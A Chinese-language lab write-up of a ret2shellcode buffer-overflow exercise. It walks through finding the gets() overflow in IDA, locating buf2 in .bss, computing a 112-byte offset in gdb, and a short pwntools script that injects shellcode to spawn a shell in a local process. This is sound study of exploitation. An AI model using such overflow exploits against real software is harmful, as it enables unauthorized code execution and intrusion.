ailx10说：这篇是我2024年4月写的。做 ret2shellcode 时，我先在代码里看到输入会被复制到全局缓冲区，于是顺着这个落点继续找：数据在哪、能不能执行、返回地址又该改到哪里。我用寄存器之间的距离算填充，再借 pwntools 生成实验用的机器码。这篇记录的是把“输入的数据”和“将要执行的位置”接起来的过程。它跟只返回现成函数的题不一样，页面权限和保护条件都会影响结果；读的时候最好跟着原样本看布局，而不是看到一个 .bss 地址就默认那里一定能执行。

---

（1）原文观察到栈具有执行权限，但后续示例将返回地址指向全局缓冲区 buf2。能否执行还需检查 buf2 所在页面的权限，不能仅凭栈权限判断。

![](/notes-assets/5420eb5c5d90c9192116.webp)

（2）实验IDA观察，缓冲区溢出点在于gets输入内容长度大于100的时候，会覆盖栈上的缓冲区 v4，可以改变main函数的返回地址，从而跳转执行 buf2 上shellcode，而 buf2 上shellcode又来自于我们控制的gets输入

因此，我们需要输入一段shellcode，然后输入一堆字符串A，达到触发缓冲区溢出的条件，再用buf2地址覆盖main函数的返回值，这样buf2地址上的我们输入的shellcode就能正常工作了

我们需要知道：

- 我们的输入长度：shellcode \+ 填充A字符串长度
- 我们的输入起始地址，与main函数返回地址的距离
- buf2地址

![](/notes-assets/7cdef5e75086551be7b7.webp)

（3）可以看到 buf2 的地址是`.bss`段上的 0804A080，`.bss`段通常用来存放程序中未初始化的全局变量

![](/notes-assets/b129798b3f31c1886d3a.webp)

（4）我们看到 `call _gets` 的地址是 08048593 ，而我们输入的字符串起始地址是 esp\+1Ch

```
.text:0804858C                 lea     eax, [esp+1Ch]

.text:08048590                 mov     [esp], eax

.text:08048593                 call    _gets
```

![](/notes-assets/70bce0294eb741b52e3b.webp)

（5）通过gdb下断点，查看寄存器 `info registers` 得到 esp 和 ebp

- esp 0xffffd4e0
- ebp 0xffffd568

![](/notes-assets/a29f58f209525fed015b.webp)

可以看出，我们输入的字符串起始地址与ebp的距离是0x6c，十进制是108

![](/notes-assets/19f54e6af2cd68a51ca3.webp)

因此，shellcode \+ 填充A 的长度是 108\+4\=112，然后放buf2地址，就大功告成了

（6）在VPS本地，基于Python3的pwntools来写一个溢出利用，成功getshell

注意：`shellcode.ljust(112,b'A')` 将生成的 shellcode 左对齐填充到长度为 112 字节的字符串中，不足部分用字符 `'A'` 填充

```
# python3



from pwn import *



sh = process('./ret2shellcode')

shellcode = asm(shellcraft.sh())

buf2_addr = 0x804a080



sh.sendline(shellcode.ljust(112, b'A') + p32(buf2_addr))

sh.interactive()
```

![](/notes-assets/b9dc57a7b4b4f65336e4.webp)

机器码、存放位置和返回地址终于对上以后，再回头看每一步的条件，整个过程才完整。少了页面权限这块，脚本就算能发出去，也不一定会走成预期的结果。
